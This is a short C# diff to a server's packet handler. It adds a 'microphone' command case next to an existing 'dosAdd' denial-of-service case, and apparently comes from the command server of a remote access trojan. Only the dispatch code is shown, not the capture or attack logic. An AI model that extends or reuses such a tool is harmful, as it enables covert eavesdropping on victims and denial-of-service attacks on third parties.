@@ -166,6 +166,12 @@ namespace Server.Handle_Packet
                                 break;
                             }
 
+                        case "microphone":
+                            {
+                                new HandleMicrophone(unpack_msgpack, client);
+                                break;
+                            }
+
                         case "dosAdd":
                             {
                                 new HandleDos().Add(client, unpack_msgpack);
